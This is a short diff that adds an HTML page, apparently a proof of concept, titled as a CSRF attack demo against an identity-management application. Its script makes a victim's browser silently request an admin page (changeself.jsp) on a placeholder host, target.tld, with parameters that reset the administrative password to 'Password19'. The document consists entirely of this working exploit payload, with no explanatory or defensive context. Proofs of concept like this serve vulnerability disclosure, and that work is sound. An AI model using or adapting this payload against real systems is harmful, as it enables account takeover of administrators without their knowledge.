@@ -1,0 +1,10 @@
+&lt;html&gt;
+&lt;h1&gt;CSRF attack demo - changes administrative password to &#039;Password19&#039;&lt;/h1&gt;
+&lt;script&gt;
+        var img = new Image();
+        img.src =
+&#039;https://target.tld/idm/admin/changeself.jsp?id=&amp;command=Save&amp;activeControl=&amp;resourceAccounts.password=Password19&amp;resourceAccounts.confirmPassword=Passwo
+rd19&amp;resourceAccounts.currentResourceAccounts%5BLighthouse%5D.selected=true&#039;;
+
+&lt;/script&gt;
+&lt;/html&gt;
